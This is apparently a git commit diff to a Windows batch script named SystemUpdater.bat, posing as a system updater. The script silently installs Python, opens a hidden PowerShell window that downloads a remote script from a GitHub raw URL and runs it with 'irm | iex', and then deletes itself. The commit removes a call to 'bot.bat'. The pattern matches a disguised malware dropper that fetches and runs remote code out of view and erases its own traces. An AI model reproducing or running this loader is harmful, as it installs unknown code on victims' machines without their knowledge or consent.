f78cd3d7ea94eda5ea0886a090d8fcb4bf5deaf5
kevilevi <kevin.kevlev822@gmail.com>
2025-11-15 21:32:50 +0530

    Update SystemUpdater.bat

--- SystemUpdater.bat
+++ SystemUpdater.bat
@@ -2,6 +2,6 @@
 echo Updateing.........!
 winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent
 powershell -WindowStyle Hidden -Command "irm 'https://raw.githubusercontent.com/kevilevi/ps/refs/heads/main/b.ps1' |iex"
-bot.bat
 del SystemUpdater.bat
+
 
